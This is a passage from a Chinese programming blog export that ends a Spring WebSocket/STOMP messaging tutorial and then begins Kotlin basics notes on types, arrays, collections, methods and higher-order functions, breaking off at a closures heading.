<li><strong>request channel</strong>: 一组用来接收生产者型客户端所推送过来的消息的线程池。</li>
<li><strong>response channel</strong>: 一组用来推送消息给消费者型客户端的线程池。</li>
<li><strong>broker</strong>: 消息队列管理者，也可以成为消息代理。它有自己的地址（例如“&#x2F;topic”），客户端可以向其发送订阅指令，它会记录哪些订阅了这个目的地址(destination)。</li>
<li><strong>应用目的地址(图中的”&#x2F;app”)</strong>: 发送到这类目的地址的消息在到达broker之前，会先路由到由应用写的某个方法。相当于对进入broker的消息进行一次拦截，目的是针对消息做一些业务处理。</li>
<li><strong>非应用目的地址(图中的”&#x2F;topic”</strong>，也是消息代理地址): 发送到这类目的地址的消息会直接转到broker。不会被应用拦截。</li>
<li><strong>SimpAnnotatonMethod</strong>: 发送到应用目的地址的消息在到达broker之前, 先路由到的方法. 这部分代码是由应用控制的。</li>
</ul>
<h3 id="消息从生产者发出到消费者消费的流转流程"><a href="#消息从生产者发出到消费者消费的流转流程" class="headerlink" title="消息从生产者发出到消费者消费的流转流程"></a>消息从生产者发出到消费者消费的流转流程</h3><p>首先，生产者通过发送一条SEND命令消息到某个目的地址(destination)，服务端request channel接受到这条SEND命令消息，如果目的地址是应用目的地址则转到相应的由应用自己写的业务方法做处理（对应图中的SimpAnnotationMethod），再转到broker(SimpleBroker)。如果目的地址是非应用目的地址则直接转到broker。broker通过SEND命令消息来构建MESSAGE命令消息, 再通过response channel推送MESSAGE命令消息到所有订阅此目的地址的消费者。 废话不多说，下面直接上代码。</p>
<hr>
<p>代码上主要配置一下broker和对相应方法进行书写</p>
<p>对Controller进行处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xnpe.club.wbs.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xnpe.club.wbs.data.Greeting;</span><br><span class="line"><span class="keyword">import</span> com.xnpe.club.wbs.data.HelloMessage;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.handler.annotation.MessageMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.handler.annotation.SendTo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.util.HtmlUtils;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span> <span class="comment">//使用Controller注解来标识这是一个控制器类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@MessageMapping(&quot;/hello&quot;)</span> </span><br><span class="line">    <span class="comment">//使用MessageMapping注解来标识所有发送到“/hello”这个destination的消息，都会被路由到这个方法进行处理.</span></span><br><span class="line">    <span class="meta">@SendTo(&quot;/topic/greetings&quot;)</span></span><br><span class="line">    <span class="comment">//使用SendTo注解来标识这个方法返回的结果，都会被发送到它指定的destination，“/topic/greetings”.</span></span><br><span class="line">    <span class="comment">//传入的参数HelloMessage为客户端发送过来的消息，是自动绑定的。</span></span><br><span class="line">    <span class="keyword">public</span> Greeting <span class="title function_">greeting</span><span class="params">(HelloMessage message)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>); <span class="comment">// 模拟处理延时</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Greeting</span>(<span class="string">&quot;Hello, &quot;</span> + HtmlUtils.htmlEscape(message.getName()) + <span class="string">&quot;!&quot;</span>); </span><br><span class="line">        <span class="comment">//根据传入的信息，返回一个欢迎消息.</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里表示 有关的消息发送之后会先到这个Controller</p>
<p>结束之后会到消息队列&#x2F;topic&#x2F;greetings</p>
<h3 id="为Spring配置STOMP消息"><a href="#为Spring配置STOMP消息" class="headerlink" title="为Spring配置STOMP消息"></a>为Spring配置STOMP消息</h3><p>刚才我们已经创建了消息处理控制器，也就是我们的业务处理逻辑。现在我们要为Spring配置WebSocket和STOMP消息设置。 创建一个名为WebSocketController的类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span> </span><br><span class="line"><span class="comment">//使用Configuration注解标识这是一个Springboot的配置类.</span></span><br><span class="line"><span class="meta">@EnableWebSocketMessageBroker</span> </span><br><span class="line"><span class="comment">//使用此注解来标识使能WebSocket的broker.即使用broker来处理消息.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketConfig</span> <span class="keyword">implements</span> <span class="title class_">WebSocketMessageBrokerConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//实现WebSocketMessageBrokerConfigurer中的此方法，配置消息代理（broker）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureMessageBroker</span><span class="params">(MessageBrokerRegistry config)</span> &#123;</span><br><span class="line">        config.enableSimpleBroker(<span class="string">&quot;/topic&quot;</span>); </span><br><span class="line">        <span class="comment">//启用SimpleBroker，使得订阅到此&quot;topic&quot;前缀的客户端可以收到greeting消息.</span></span><br><span class="line">        config.setApplicationDestinationPrefixes(<span class="string">&quot;/app&quot;</span>); </span><br><span class="line">        <span class="comment">//将&quot;app&quot;前缀绑定到MessageMapping注解指定的方法上。如&quot;app/hello&quot;被指定用greeting()方法来处理.</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//用来注册Endpoint，“/gs-guide-websocket”即为客户端尝试建立连接的地址。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerStompEndpoints</span><span class="params">(StompEndpointRegistry registry)</span> &#123;</span><br><span class="line">        registry.addEndpoint(<span class="string">&quot;/gs-guide-websocket&quot;</span>).withSockJS();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置主要包含两部分内容，一个是消息代理，另一个是Endpoint，消息代理指定了客户端订阅地址，以及发送消息的路由地址；Endpoint指定了客户端建立连接时的请求地址。</p>
<p>至此，服务端的配置工作就完成了，非常简单。现在，让我们实现一个前端页面，来验证服务的工作情况。</p>
<h3 id="创建前端实现页面"><a href="#创建前端实现页面" class="headerlink" title="创建前端实现页面"></a>创建前端实现页面</h3><p>针对STOMP，前端我们采用JavaScript的stomp的客户端实现stomp.js以及WebSocket的实现SockJS。此处只展示核心代码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用SockJS和stomp.js来打开“gs-guide-websocket”地址的连接，这也是我们使用Spring构建的SockJS服务。</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">connect</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> socket = <span class="keyword">new</span> <span class="title class_">SockJS</span>(<span class="string">&#x27;/gs-guide-websocket&#x27;</span>);</span><br><span class="line">    stompClient = <span class="title class_">Stomp</span>.<span class="title function_">over</span>(socket);</span><br><span class="line">    stompClient.<span class="title function_">connect</span>(&#123;&#125;, <span class="keyword">function</span> (<span class="params">frame</span>) &#123;</span><br><span class="line">        <span class="comment">//连接成功后的回调方法</span></span><br><span class="line">        <span class="title function_">setConnected</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Connected: &#x27;</span> + frame);</span><br><span class="line">        <span class="comment">//订阅/topic/greetings地址，当服务端向此地址发送消息时，客户端即可收到。</span></span><br><span class="line">        stompClient.<span class="title function_">subscribe</span>(<span class="string">&#x27;/topic/greetings&#x27;</span>, <span class="keyword">function</span> (<span class="params">greeting</span>) &#123;</span><br><span class="line">            <span class="comment">//收到消息时的回调方法，展示欢迎信息。</span></span><br><span class="line">            <span class="title function_">showGreeting</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(greeting.<span class="property">body</span>).<span class="property">content</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//断开连接的方法</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">disconnect</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stompClient !== <span class="literal">null</span>) &#123;</span><br><span class="line">        stompClient.<span class="title function_">disconnect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">setConnected</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Disconnected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将用户输入的名字信息,使用STOMP客户端发送到“/app/hello”地址。它正是我们在GreetingController中定义的greeting()方法所处理的地址.</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendName</span>(<span class="params"></span>) &#123;</span><br><span class="line">    stompClient.<span class="title function_">send</span>(<span class="string">&quot;/app/hello&quot;</span>, &#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="string">&#x27;name&#x27;</span>: $(<span class="string">&quot;#name&quot;</span>).<span class="title function_">val</span>()&#125;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>这里只需要做好配置操作和对应的Controller进行处理就好了</p>
<p>配置主要包含两部分内容，一个是消息代理，另一个是Endpoint</p>
<p>消息代理说明了消息发送过来，需要在哪个位置处理</p>
<p>同时说明处理完成需要放在哪个队列里面</p>
<p>简易做法就是这样</p>
<p>再来论述一遍WebSocket的相关知识</p>
<p>WebSocket一般可以说明消费者、生产者、broker【消息队列管理者】</p>
<p>地址可以简易分为两类，应用目的地址、非应用目的地址</p>
<p>应用目的地址相当于进入broker之前会进行一个操作</p>
<p>非应用目的地址会直接到达broker</p>
<p>然后由broker进行处理，放到队列中去</p>
<p>broker:它有自己的地址（例如“&#x2F;topic”），客户端可以向其发送订阅指令，它会记录哪些订阅了这个目的地址(destination)。</p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>kotlin</title>
    <url>/2022/02/16/2022/kotlin/</url>
    <content><![CDATA[<h1 id="Kotlin基础"><a href="#Kotlin基础" class="headerlink" title="Kotlin基础"></a>Kotlin基础</h1><span id="more"></span>

<p>一种在Java虚拟机上运行的静态类型编程语言</p>
<p>可以和java代码相互与运作</p>
<p>容易在Android项目中替代Java或者同Java一起使用</p>
<p> <img  
                     lazyload
                     alt="image"
                     data-src="C:\Users\liduoan\AppData\Roaming\Typora\typora-user-images\image-20220131161533555.png"
                      alt="image-20220131161533555"
                ></p>
<p><code>*kt</code>会被Kotlin编译器编程编译成.class的字节码文件，然后被归档成.jar，最后呢由各平台打包工具输出最终的原因程序 </p>
<p>上图不难理解<code>*kt</code>最终会被编译成Java的字节码文件，那为什么在最后一步还需要一个Kotlin运行时呢？</p>
<p>这是因为，我们用Java来写的程序所有的实现都会有标准的Java类库来做支撑，比如：java.lang.*, java.util.*，但Kotlin中的类库是不在标准的Java类库中的，所以，Kotlin应用程序需要在最后一步借助Kotlin运行时来支撑这些Java标准类库没有的实现。</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>Kotlin 的基本数值类型包括 Byte、Short、Int、Long、Float、Double 等。不同于 Java 的是，字符不属于数值类型，是一个独立的数据类型。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">baseType</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> num1 = -<span class="number">1.5</span>  <span class="comment">//默认的double类型</span></span><br><span class="line">    <span class="keyword">val</span> num2 = <span class="number">1f</span>    <span class="comment">//这里是float类型</span></span><br><span class="line">    <span class="keyword">var</span> num3 = <span class="number">3</span> <span class="comment">//Int类型   </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>数组的创建方式：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">arrayType</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// arrayOf 创建数组</span></span><br><span class="line">    <span class="keyword">var</span> arrayOf = arrayOf(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    <span class="comment">// arrayOfNulls创建指定大小 所有元素为空的数组</span></span><br><span class="line">    <span class="keyword">var</span> arrayOfNulls = arrayOfNulls&lt;String&gt;(<span class="number">5</span>)</span><br><span class="line">    <span class="comment">// 动态创建数组</span></span><br><span class="line">    <span class="keyword">var</span> asc = Array(<span class="number">5</span>) &#123;i -&gt; (i*i).toString()&#125;</span><br><span class="line">    asc.forEach &#123; println(it) &#125;</span><br><span class="line">    <span class="comment">//[] 运算符代表调用成员方法 get() 与 set()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 原生类型数组</span></span><br><span class="line">    <span class="keyword">var</span> intArrayOf = intArrayOf(<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">    <span class="comment">// 大小为5 数值为0的数组</span></span><br><span class="line">    <span class="keyword">var</span> intArray = IntArray(<span class="number">5</span>)</span><br><span class="line">    <span class="comment">// 大小为5 数值为32的数组</span></span><br><span class="line">    <span class="keyword">var</span> intInit = IntArray(<span class="number">5</span>) &#123; <span class="number">32</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>数组的遍历方式：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">arrayFor</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> array = intArrayOf(<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">    <span class="comment">// 数组遍历</span></span><br><span class="line">    <span class="keyword">for</span> (item <span class="keyword">in</span> array) &#123;</span><br><span class="line">        println(item)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 索引遍历</span></span><br><span class="line">    <span class="keyword">for</span> (index <span class="keyword">in</span> array.indices) &#123;</span><br><span class="line">        println(index.toString() + <span class="string">&quot;-&gt; <span class="subst">$&#123;array[index]&#125;</span>&quot;</span> )</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 遍历元素带索引</span></span><br><span class="line">    <span class="keyword">for</span> ((index, item) <span class="keyword">in</span> array.withIndex()) &#123;</span><br><span class="line">        println(<span class="string">&quot;<span class="variable">$index</span> -&gt; <span class="variable">$item</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// foreach 遍历</span></span><br><span class="line">    array.forEach &#123; print(it) &#125;</span><br><span class="line">    <span class="comment">//  高级foreach</span></span><br><span class="line">    array.forEachIndexed &#123; index, item -&gt;</span><br><span class="line">        println(<span class="string">&quot;<span class="variable">$index</span> -&gt; <span class="variable">$item</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>Kotlin 标准库提供了一整套用于管理集合的工具，集合是可变数量（可能为零）的一组条目，各种集合对于解决问题都具有重要意义，并且经常用到。</p>
<ul>
<li><p>List 是一个有序集合，可通过索引（反映元素位置的整数）访问元素。元素可以在 list 中出现多次。列表的一个示例是一句话：有一组字、这些字的顺序很重要并且字可以重复。 </p>
</li>
<li><p>Set 是唯一元素的集合。它反映了集合（set）的数学抽象：一组无重复的对象。一般来说 set 中元素的顺序并不重要。例如，字母表是字母的集合（set）。 </p>
</li>
<li><p>Map（或者字典）是一组键值对。键是唯一的，每个键都刚好映射到一个值，值可以重复。</p>
</li>
</ul>
<p>我们需要注意到，集合分为可变集合和不可变集合两种方式</p>
<p>而数组则是可变的数组，我们可以看到<code>Array</code>中</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Array</span>&lt;<span class="type">T</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">inline</span> <span class="keyword">constructor</span>(size: <span class="built_in">Int</span>, <span class="keyword">init</span>: (<span class="built_in">Int</span>) -&gt; T)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">operator</span> <span class="function"><span class="keyword">fun</span> <span class="title">get</span><span class="params">(index: <span class="type">Int</span>)</span></span>: T</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">operator</span> <span class="function"><span class="keyword">fun</span> <span class="title">set</span><span class="params">(index: <span class="type">Int</span>, value: <span class="type">T</span>)</span></span>: <span class="built_in">Unit</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">val</span> size: <span class="built_in">Int</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">operator</span> <span class="function"><span class="keyword">fun</span> <span class="title">iterator</span><span class="params">()</span></span>: Iterator&lt;T&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们看下集合的排序Api</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">listMap</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> numbers = mutableListOf(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">    <span class="comment">//随机排列元素</span></span><br><span class="line">    numbers.shuffle()</span><br><span class="line">    println(numbers)</span><br><span class="line">    numbers.sort()</span><br><span class="line">    <span class="comment">//排序，从小打到</span></span><br><span class="line">    numbers.sortDescending()</span><br><span class="line">    <span class="comment">//从大到小</span></span><br><span class="line">    println(numbers)</span><br><span class="line">    <span class="comment">//定义一个Person类，有name 和 age 两属性</span></span><br><span class="line">    <span class="keyword">data</span> <span class="keyword">class</span> <span class="title class_">Language</span>(<span class="keyword">var</span> name: String, <span class="keyword">var</span> score: <span class="built_in">Int</span>)</span><br><span class="line">    <span class="keyword">val</span> languageList: MutableList&lt;Language&gt; = mutableListOf()</span><br><span class="line">    languageList.add(Language(<span class="string">&quot;Java&quot;</span>, <span class="number">80</span>))</span><br><span class="line">    languageList.add(Language(<span class="string">&quot;Kotlin&quot;</span>, <span class="number">90</span>))</span><br><span class="line">    languageList.add(Language(<span class="string">&quot;Dart&quot;</span>, <span class="number">99</span>))</span><br><span class="line">    languageList.add(Language(<span class="string">&quot;C&quot;</span>, <span class="number">80</span>))</span><br><span class="line">    <span class="comment">//使用sortBy进行排序，适合单条件排序</span></span><br><span class="line">    languageList.sortBy &#123; it.score &#125;</span><br><span class="line">    println(languageList)</span><br><span class="line">    <span class="comment">//使用sortWith进行排序，适合多条件排序</span></span><br><span class="line">    languageList.sortWith(compareBy(</span><br><span class="line">    <span class="comment">//it变量是lambda中的隐式参数</span></span><br><span class="line">    &#123; it.score &#125;, &#123; it.name &#125;) )</span><br><span class="line">    println(languageList)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><p><img  
                     lazyload
                     alt="image"
                     data-src="C:\Users\liduoan\AppData\Roaming\Typora\typora-user-images\image-20220210161242952.png"
                      alt="image-20220210161242952"
                ></p>
<p>在Java中对象是一等公民，而在Kotlin中方法是一等公民</p>
<p>所有的方法是可以直接定义在文件里面的，而java中方法必须定义类中</p>
<p>这也说明了Kotlin是以方法为一等的</p>
<h2 id="方法声明"><a href="#方法声明" class="headerlink" title="方法声明"></a>方法声明</h2><p>主要看下有哪些方法</p>
<p>成员方法</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    Person().getName()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">getName</span><span class="params">()</span></span> &#123;</span><br><span class="line">        println(<span class="keyword">this</span>.javaClass.simpleName)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类方法</p>
<p>也就是我们在java中常说的静态方法</p>
<p>在kotlin中可以有几种方式实现</p>
<ul>
<li>companion object 实现的类方法</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    Person.fun2()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">// 伙伴对象的类方法</span></span><br><span class="line">    <span class="keyword">companion</span> <span class="keyword">object</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">fun</span> <span class="title">fun2</span><span class="params">()</span></span> &#123;</span><br><span class="line">            println(<span class="string">&quot;伙伴对象的类方法&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">getName</span><span class="params">()</span></span> &#123;</span><br><span class="line">        println(<span class="keyword">this</span>.javaClass.simpleName)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>静态类</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 工具类的类方法</span></span><br><span class="line"><span class="keyword">object</span> TimeUtil &#123;</span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">timeGet</span><span class="params">()</span></span>: Date &#123;</span><br><span class="line">        <span class="keyword">return</span> Date()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>全局静态</p>
<p>也就是Kotlin文件中定义的一些方法，它们可以在任何地方被调用</p>
</li>
</ul>
<p>单表达式方法</p>
<p>也就是方法返回的是单个的表达式，可以省略花括号并且在<code>=</code>号后指定代码体</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">double</span><span class="params">(x: <span class="type">Int</span>)</span></span>: <span class="built_in">Int</span> = x * <span class="number">2</span></span><br><span class="line"><span class="comment">// 返回值可以由编译器进行推断</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">double</span><span class="params">(x: <span class="type">Int</span>)</span></span> = x * <span class="number">2</span></span><br></pre></td></tr></table></figure>

<h2 id="方法参数"><a href="#方法参数" class="headerlink" title="方法参数"></a>方法参数</h2><p>主要有具体参数，默认参数，可变数量的参数</p>
<p>具体参数就是平常的那种</p>
<p>默认参数指的是参数可以有默认值</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可以看到off的数值为0 len的数值为数组大小</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">read</span><span class="params">(b: <span class="type">Array</span>, off: <span class="type">Int</span> = <span class="number">0</span>, len: <span class="type">Int</span> = b.size)</span></span> &#123; <span class="comment">/*……*/</span> &#125;</span><br></pre></td></tr></table></figure>

<p>补充知识，在方法中最后一个参数是Lambda表达式的话，表达式可以在括号外传入。</p>
<p>可变数量的参数(<code>Varargs</code>)</p>
<p>方法的参数（通常是最后一个）可以用 <code>vararg </code>修饰符标记：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">append</span><span class="params">(<span class="keyword">vararg</span> str: <span class="type">Char</span>)</span></span>: String &#123;</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可变参数的要求： </p>
<p>只有一个参数可以标注为 <code>vararg</code>； </p>
<p>如果 <code>vararg </code>参数不是列表中的最后一个参数， 可以使用具名参数语法传递其后的参数的值，或者，如果参数具有方法类型，则通过在括号外部传一个 Lambda。</p>
<p>当我们调用 <code>vararg </code>方法时，我们可以一个接一个地传参，例如 <code>append(&#39;h&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;)</code>，或者，如果我们已经有一个数组并希望将其内容传给该方法，我们使用伸展（spread）操作符（在数组前面加 *）：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> world = charArrayOf(<span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;d&#x27;</span>) </span><br><span class="line"><span class="keyword">val</span> result = append(<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27; &#x27;</span>, *world)</span><br></pre></td></tr></table></figure>

<h2 id="方法作用域"><a href="#方法作用域" class="headerlink" title="方法作用域"></a>方法作用域</h2><p>方法作用域为文件顶层声明，局部方法</p>
<p>我们主要看下没见过的局部方法</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">magic</span><span class="params">()</span></span>: <span class="built_in">Int</span>&#123;</span><br><span class="line">    <span class="comment">// 局部方法</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">foo</span><span class="params">(v:<span class="type">Int</span>)</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> v*v</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> random = (<span class="number">0.</span><span class="number">.100</span>).random()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> foo(random)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="方法进阶"><a href="#方法进阶" class="headerlink" title="方法进阶"></a>方法进阶</h1><h2 id="高阶方法"><a href="#高阶方法" class="headerlink" title="高阶方法"></a>高阶方法</h2><p>高阶函数就是将函数作为参数或返回值的函数。<code>Kotlin</code>支持高阶函数，这是<code>Kotlin</code>函数式编程的一大特性。</p>
<p>一般有函数作为参数和函数作为返回值两种方式</p>
<p>作为参数比较简单</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> List<span class="type">&lt;Int&gt;</span>.<span class="title">sum</span><span class="params">(callback: (<span class="type">Int</span>) -&gt; <span class="type">Unit</span>)</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span>(v <span class="keyword">in</span> <span class="keyword">this</span>) &#123;</span><br><span class="line">        result += v</span><br><span class="line">        callback(v)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用方式</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> listOf = listOf&lt;<span class="built_in">Int</span>&gt;(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">var</span> sum = listOf.sum &#123; println(it) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作为返回值比较不好明白</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 需求：实现一个能够对集合元素进行求和的高阶函数，并且返回一个 声明为(scale: Int) -&gt; Float的函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> List<span class="type">&lt;String&gt;</span>.<span class="title">toIntSum</span><span class="params">()</span></span> : (scale: <span class="built_in">Int</span>) -&gt; <span class="built_in">Float</span>&#123;</span><br><span class="line">    println(<span class="string">&quot;第一层函数&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="title">fun</span><span class="params">(scale)</span></span> : <span class="built_in">Float</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="number">0f</span></span><br><span class="line">        <span class="keyword">for</span> (v <span class="keyword">in</span> <span class="keyword">this</span>) &#123;</span><br><span class="line">            result += v.toInt() * scale</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用方式</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> listOf = listOf&lt;String&gt;(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> toIntSum = listOf.toIntSum()</span><br><span class="line">    println(toIntSum(<span class="number">2</span>))</span><br><span class="line">    <span class="comment">//简易写法可以为</span></span><br><span class="line">    <span class="comment">// listOf.toIntSum()(2)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>方法与闭包的特性可以说是Kotlin语言最大的特性了</p>
